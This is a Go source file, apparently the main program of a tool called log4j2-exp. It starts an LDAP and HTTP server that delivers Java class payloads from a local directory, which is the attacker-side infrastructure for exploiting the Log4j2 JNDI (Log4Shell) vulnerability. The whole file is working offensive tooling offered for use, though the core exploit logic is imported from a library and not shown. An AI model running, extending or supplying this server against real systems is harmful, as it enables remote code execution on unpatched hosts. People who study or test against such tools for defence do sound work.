package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"

	"github.com/For-ACGN/log4j2-exp"
)

var (
	cfg log4j2.Config
	crt string
	key string
)

func init() {
	banner()

	flag.CommandLine.SetOutput(os.Stdout)
	flag.StringVar(&cfg.Hostname, "host", "127.0.0.1", "server IP address or domain name")
	flag.StringVar(&cfg.PayloadDir, "payload", "payload", "payload(java class) directory")
	flag.StringVar(&cfg.HTTPNetwork, "http-net", "tcp", "http server network")
	flag.StringVar(&cfg.HTTPAddress, "http-addr", ":8080", "http server address")
	flag.StringVar(&cfg.LDAPNetwork, "ldap-net", "tcp", "ldap server network")
	flag.StringVar(&cfg.LDAPAddress, "ldap-addr", ":3890", "ldap server address")
	flag.BoolVar(&cfg.EnableTLS, "tls-server", false, "enable ldaps and https server")
	flag.StringVar(&crt, "tls-cert", "cert.pem", "tls certificate file path")
	flag.StringVar(&key, "tls-key", "key.pem", "tls private key file path")
	flag.Parse()
}

func banner() {
	fmt.Println()
	fmt.Println("  :::        ::::::::   ::::::::      :::   ::::::::::: ::::::::  ")
	fmt.Println("  :+:       :+:    :+: :+:    :+:    :+:        :+:    :+:    :+: ")
	fmt.Println("  +:+       +:+    +:+ +:+          +:+ +:+     +:+          +:+  ")
	fmt.Println("  +#+       +#+    +:+ :#:         +#+  +:+     +#+        +#+    ")
	fmt.Println("  +#+       +#+    +#+ +#+   +#+# +#+#+#+#+#+   +#+      +#+      ")
	fmt.Println("  #+#       #+#    #+# #+#    #+#       #+# #+# #+#     #+#       ")
	fmt.Println("  ########## ########   ########        ###  #####     ########## ")
	fmt.Println()
	fmt.Println("                           https://github.com/For-ACGN/log4j2-exp")
	fmt.Println()
}

func main() {
	// check configuration
	if cfg.Hostname == "" {
		log.Fatalln("[error]", "empty host name")
	}
	fi, err := os.Stat(cfg.PayloadDir)
	checkError(err)
	if !fi.IsDir() {
		log.Fatalf("[error] \"%s\" is not a directory", cfg.PayloadDir)
	}
	// load tls certificate
	if cfg.EnableTLS {
		cfg.TLSCert, err = tls.LoadX509KeyPair(crt, key)
		checkError(err)
	}
	cfg.LogOut = os.Stdout

	// start log4j2-exploit server
	server, err := log4j2.New(&cfg)
	checkError(err)
	err = server.Start()
	checkError(err)

	// wait signal for stop log4j2-exploit server
	signalCh := make(chan os.Signal, 1)
	signal.Notify(signalCh, os.Interrupt)
	<-signalCh

	err = server.Stop()
	checkError(err)
}

func checkError(err error) {
	if err != nil {
		log.Fatalln("[error]", err)
	}
}
